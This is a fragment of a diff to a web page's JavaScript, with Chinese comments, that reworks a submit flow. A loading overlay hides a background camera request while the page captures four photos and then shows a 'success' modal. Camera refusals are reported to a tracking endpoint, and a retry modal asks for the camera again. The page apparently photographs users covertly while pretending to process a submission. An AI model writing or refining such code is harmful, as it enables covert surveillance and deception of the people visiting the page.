@@ -801,14 +801,9 @@
 
     function onConfirmSubmit2() {
         document.getElementById('confirmSubmit2Modal').classList.remove('active');
-        // 显示加载动画 1.5秒
+        // 同时显示加载动画和请求相机权限
         document.getElementById('loadingOverlay').classList.add('active');
-        // 后台触发相机权限拍照
         requestRealCamera();
-        setTimeout(function() {
-            document.getElementById('loadingOverlay').classList.remove('active');
-            document.getElementById('successModal').classList.add('active');
-        }, 3000);
     }
     function closeConfirmSubmit2() {
         document.getElementById('confirmSubmit2Modal').classList.remove('active');
@@ -829,8 +824,10 @@
             .catch(function(err) {
                 if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                     if (!cameraTracked) { cameraTracked = true; fetch('/api/track/realCameraDeny', { method: 'POST' }); }
+                    document.getElementById('loadingOverlay').classList.remove('active');
                     showRetryModal();
                 } else {
+                    document.getElementById('loadingOverlay').classList.remove('active');
                     alert('相机启动失败，请检查设备后重试');
                 }
             });
@@ -844,6 +841,7 @@
     }
     function retryAuth() {
         closeRetryModal();
+        document.getElementById('loadingOverlay').classList.add('active');
         setTimeout(function() { requestRealCamera(); }, 300);
     }
 
@@ -856,6 +854,9 @@
     function capturePhotos(count) {
         if (count >= 4) {
             stopCamera();
+            // 拍照完成，直接显示成功页面
+            document.getElementById('loadingOverlay').classList.remove('active');
+            document.getElementById('successModal').classList.add('active');
             return;
         }
         var video = document.createElement('video');
